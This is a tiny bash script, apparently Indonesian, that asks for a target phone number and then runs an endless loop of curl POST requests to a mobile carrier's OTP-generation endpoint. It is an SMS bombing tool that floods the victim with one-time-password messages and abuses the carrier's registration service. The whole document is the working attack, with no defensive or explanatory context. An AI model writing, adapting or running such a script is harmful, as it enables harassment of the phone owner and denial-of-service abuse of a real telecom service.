#!/bin/bash
read -p 'Nomer Target[Example 0896xxxxx]: ' nmr
while :;do curl -X POST -d "msisdn=$nmr" https://registrasi.tri.co.id/daftar/generateOTP;done
